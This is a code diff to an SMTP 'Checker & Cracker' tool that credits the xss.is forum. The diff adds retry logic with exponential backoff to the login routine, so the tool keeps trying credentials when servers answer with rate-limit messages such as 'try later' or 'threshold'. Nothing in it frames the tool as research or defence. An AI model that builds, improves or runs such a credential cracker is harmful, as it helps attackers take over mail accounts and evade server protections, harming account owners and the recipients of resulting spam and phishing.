@@ -46,7 +46,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v34.12.13{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v4.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -377,8 +377,7 @@ socket.setdefaulttimeout(30)
 
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
     """
-    Подключается к SMTP-серверу, выполняет логин.
-    Разрывает соединение, если оно зависает.
+    Подключается к SMTP-серверу, выполняет логин с повторными попытками.
     """
     global verify_email
     if is_valid_email(smtp_user):
@@ -386,23 +385,31 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
     else:
         smtp_login = smtp_user
 
-    try:
-        s = socket_get_free_smtp_server(smtp_server, port)
-        answer = socket_send_and_read(s)
-        if answer[:3] == '220':  # Успешное подключение к серверу
-            s = socket_try_tls(s, smtp_server) if port != '465' else s
-            s = socket_try_login(s, smtp_server, smtp_login, password)  # Попытка входа
-
-            # Если аутентификация успешна, сервер считается рабочим
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            s = socket_get_free_smtp_server(smtp_server, port)
+            answer = socket_send_and_read(s)
+            if answer[:3] == '220':
+                s = socket_try_tls(s, smtp_server) if port != '465' else s
+                s = socket_try_login(s, smtp_server, smtp_login, password)
+                s.close()
+                return True
             s.close()
-            return True
-
-        s.close()
-        raise Exception(answer)
-
-    except (socket.timeout, ConnectionResetError) as e:
-        print(f"[ERROR] SMTP-соединение разорвано из-за таймаута или сброса соединения: {e}")
-        return False
+            raise Exception(answer)
+        except (socket.timeout, ConnectionResetError) as e:
+            if attempt < max_retries - 1 and any(x in str(e).lower() for x in ['timeout', 'reset', 'try later', 'threshold']):
+                wait = (2  ** attempt) + random.uniform(0.5, 1.5)
+                time.sleep(wait)
+                continue
+            raise
+        except Exception as e:
+            if attempt < max_retries - 1 and any(x in str(e).lower() for x in ['try later', 'threshold', 'parallel connections']):
+                wait = (2 ** attempt) + random.uniform(0.5, 1.5)
+                time.sleep(wait)
+                continue
+            raise
+    return False
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
